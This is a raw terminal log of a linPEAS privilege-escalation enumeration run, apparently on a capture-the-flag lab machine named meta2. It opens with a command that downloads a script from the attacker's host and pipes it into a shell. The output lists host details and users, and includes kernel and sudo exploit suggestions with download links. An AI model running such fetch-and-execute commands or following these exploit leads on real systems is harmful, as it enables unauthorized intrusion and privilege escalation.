$ curl 10.10.14.119/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  4  840k    4 39840    0     0   120k      0  0:00:06 --:--:--  0:00:06  120k

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                    
    |---------------------------------------------------------------------------------|                                                                                                    
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                    
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                    
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                    
    |---------------------------------------------------------------------------------|                                                                                                    
    |                                 Thank you!                                      |                                                                                                    
    \---------------------------------------------------------------------------------/                                                                                                    
          linpeas-ng by carlospolop                                                                                                                                                        
                                                                                                                                                                                           
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                            
                                                                                                                                                                                           
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                   
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

 23  840k   23  200k    0     0   130k      0  0:00:06  0:00:01  0:00:05  130k                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                        
                               ╚═══════════════════╝                                                                                                                                       
OS: Linux version 5.10.0-19-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.149-2 (2022-10-21)
User & Groups: uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
Hostname: meta2
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                    
                                                                                                                                                                                           
                                                                                                                                                                                           

 47  840k   47  400k    0     0  74749      0  0:00:11  0:00:05  0:00:06 74735DONE. . . . . . . . . . . . 
                                                                                                                                                                                           
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                         
                              ╚════════════════════╝                                                                                                                                       
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                         
Linux version 5.10.0-19-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.149-2 (2022-10-21)   
Distributor ID: Debian
Description: Debian GNU/Linux 11 (bullseye)
Release: 11
Codename: bullseye

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                            
Sudo version 1.9.5p2                                                                                                                                                                       


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                    
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                                                                                                                                   

╔══════════╣ Date & uptime
Fri 15 Mar 2024 06:09:11 PM GMT                                                                                                                                                            
 18:09:11 up  3:25,  1 user,  load average: 0.09, 0.03, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                       
sda
sda1
sda2

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                  
/dev/sda1 /               ext4    errors=remount-ro 0       1                                                                                                                              
/dev/sda2 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
proc    /proc   proc    defaults,hidepid=2    0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                    
HISTFILESIZE=0                                                                                                                                                                             
USER=jnelson
SSH_CLIENT=10.10.14.119 44574 22
XDG_SESSION_TYPE=tty
SHLVL=0
MOTD_SHOWN=pam
HOME=/home/jnelson
SSH_TTY=/dev/pts/0
LOGNAME=jnelson
_=/usr/bin/sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=485
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
PWD=/home/jnelson
SSH_CONNECTION=10.10.14.119 44574 10.129.228.95 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                     
dmesg Not Found                                                                                                                                                                            
                                                                                                                                                                                           
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                         
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops                                                                                                                             

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                    
                                                                                                                                                                                           
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                              
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                   
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                          
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                   
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                     
═╣ Seccomp enabled? ............... disabled                                                                                                                                               
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                           

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                        
                                   ╚═══════════╝                                                                                                                                           
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                                                                                                             
╔══════════╣ Container details                                                                                                                                                             
═╣ Is this a container? ........... No                                                                                                                                                     
═╣ Any running containers? ........ No                                                                                                                                                     
                                                                                                                                                                                           

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                        
                                     ╚═══════╝                                                                                                                                             
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? .......................... 
═╣ IBM Cloud VM? ........................ No                                                                                                                                               
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No

curl: (6) Could not resolve host: metadata.google.internal


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                         
                ╚════════════════════════════════════════════════╝                                                                                                                         
╔══════════╣ Cleaned processes
[i] Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes                                                                           
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                
Looks like /etc/fstab has hidepid=2, so ps will not show processes of other users                                                                                                          
                 thread-self  cat/proc/thread-self//cmdline
                 self      cat/proc/self//cmdline
                 7715      sh
                 7712      seds,amazon-ssm-agent|knockd|splunk,&,
                 7710      seds,root,&,
                 7709      seds,jnelson,&,
                 7704      sort-r
                 7702      sh
                 7700      sh
                 4572      sh
                 4571      curl10.10.14.119/linpeas.sh
                 4261      -bash

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                         
COMMAND  PID    USER   FD   TYPE             DEVICE SIZE/OFF  NODE NAME                                                                                                                    

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                         
gdm-password Not Found                                                                                                                                                                     
gnome-keyring-daemon Not Found                                                                                                                                                             
lightdm Not Found                                                                                                                                                                          
vsftpd Not Found                                                                                                                                                                           
apache2 Not Found                                                                                                                                                                          
sshd Not Found                                                                                                                                                                             
                                                                                                                                                                                           
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                     
/usr/bin/crontab                                                                                                                                                                           
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 22  2021 /etc/crontab                                                                                                                                   

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar 15 18:09 ..
-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
-rw-r--r--  1 root root  712 Dec 22  2021 php
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.daily:
total 24
drwxr-xr-x  2 root root 4096 Oct  5  2022 .
drwxr-xr-x 76 root root 4096 Mar 15 18:09 ..
-rwxr-xr-x  1 root root 1478 Jun 10  2021 apt-compat
-rwxr-xr-x  1 root root 1298 Jan 30  2021 dpkg
-rwxr-xr-x  1 root root  377 Feb 28  2021 logrotate
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar 15 18:09 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar 15 18:09 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.weekly:
total 12
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar 15 18:09 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 * * * * root    cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                             
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                          

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                
/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path                                                                                          
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                  
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                                                          
Fri 2024-03-15 18:29:19 GMT 18min left    Tue 2022-10-25 11:24:08 BST 1 years 4 months ago apt-daily.timer              apt-daily.service
Fri 2024-03-15 18:39:00 GMT 28min left    Fri 2024-03-15 18:09:03 GMT 1min 35s ago         phpsessionclean.timer        phpsessionclean.service
Sat 2024-03-16 00:00:00 GMT 5h 49min left Fri 2024-03-15 14:44:05 GMT 3h 26min ago         logrotate.timer              logrotate.service
Sat 2024-03-16 06:36:12 GMT 12h left      Fri 2024-03-15 15:35:37 GMT 2h 35min ago         apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2024-03-16 14:59:05 GMT 20h left      Fri 2024-03-15 14:59:05 GMT 3h 11min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2024-03-17 03:10:14 GMT 1 day 8h left Fri 2024-03-15 14:45:03 GMT 3h 25min ago         e2scrub_all.timer            e2scrub_all.service
Mon 2024-03-18 00:42:44 GMT 2 days left   Fri 2024-03-15 14:49:46 GMT 3h 20min ago         fstrim.timer                 fstrim.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                  
                                                                                                                                                                                           
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                 
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket                                                                                         
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                 
sed: -e expression #1, char 0: no previous regular expression                                                                                                                              
/run/dbus/system_bus_socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/php/php8.0-fpm.sock
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/user/1000/systemd/inaccessible/sock
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                   
                                                                                                                                                                                           
╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                   
NAME                       PID PROCESS USER    CONNECTION    UNIT SESSION DESCRIPTION                                                                                                      
:1.0                         1 n/a     root    :1.0          -    -       -
:1.1                       435 n/a     root    :1.1          -    -       -
:1.11                     9590 busctl  jnelson :1.11         -    -       -
org.freedesktop.DBus         1 n/a     root    -             -    -       -
org.freedesktop.hostname1    - -       -       (activatable) -    -       -
org.freedesktop.locale1      - -       -       (activatable) -    -       -
org.freedesktop.login1     435 n/a     root    :1.1          -    -       -
org.freedesktop.network1     - -       -       (activatable) -    -       -
org.freedesktop.resolve1     - -       -       (activatable) -    -       -
org.freedesktop.systemd1     1 n/a     root    :1.0          -    -       -
org.freedesktop.timedate1    - -       -       (activatable) -    -       -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                        
                              ╚═════════════════════╝                                                                                                                                      
╔══════════╣ Hostname, hosts and DNS
meta2                                                                                                                                                                                      
127.0.0.1 localhost
127.0.1.1 meta2 metapress.htb

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 1.1.1.1
nameserver 8.8.8.8

╔══════════╣ Interfaces
default  0.0.0.0                                                                                                                                                                           
loopback 127.0.0.0
link-local 169.254.0.0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.228.95  netmask 255.255.0.0  broadcast 10.129.255.255
        ether 00:50:56:b0:07:aa  txqueuelen 1000  (Ethernet)
        RX packets 201206  bytes 14524764 (13.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 112848  bytes 73082123 (69.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 123  bytes 24311 (23.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 24311 (23.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                              
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                          
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                         
                                                                                                                                                                                           


 83  840k   83  700k    0     0   7593      0  0:01:53  0:01:34  0:00:19  7593                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                        
                               ╚═══════════════════╝                                                                                                                                       
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                   
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)                                                                                                                                   

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                               
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                           
                                                                                                                                                                                           
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                           
                                                                                                                                                                                           
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                     
ptrace protection is disabled (0), so sudo tokens could be abused                                                                                                                          

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                 
                                                                                                                                                                                           
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                            

╔══════════╣ Users with console
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash                                                                                                                                     
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                     
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(messagebus) gid=109(messagebus) groups=109(messagebus)
uid=104(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=105(mysql) gid=111(mysql) groups=111(mysql)
uid=106(proftpd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(ftp) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(systemd-coredump) gid=998(systemd-coredump) groups=998(systemd-coredump)
uid=999(systemd-timesync) gid=999(systemd-timesync) groups=999(systemd-timesync)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 18:10:40 up  3:26,  1 user,  load average: 0.16, 0.08, 0.02                                                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
jnelson  pts/0        Fri Mar 15 17:55:04 2024   still logged in                       10.10.14.119                                                                                        
metapress.htb ftpd3642     Fri Mar 15 17:19:10 2024 - Fri Mar 15 17:37:22 2024  (00:18)     0.0.0.0
metapress.htb ftpd3549     Fri Mar 15 17:13:21 2024 - Fri Mar 15 17:15:07 2024  (00:01)     0.0.0.0
reboot   system boot  Fri Mar 15 14:44:04 2024   still running                         0.0.0.0
jnelson  pts/0        Tue Oct 25 12:51:26 2022 - Tue Oct 25 12:53:49 2022  (00:02)     10.10.14.23
reboot   system boot  Tue Oct 25 12:50:57 2022 - Tue Oct 25 12:53:51 2022  (00:02)     0.0.0.0
root     tty1         Tue Oct 25 11:13:33 2022 - down                      (00:15)     0.0.0.0
reboot   system boot  Tue Oct 25 11:12:10 2022 - Tue Oct 25 11:29:21 2022  (00:17)     0.0.0.0

wtmp begins Tue Oct 25 11:12:10 2022

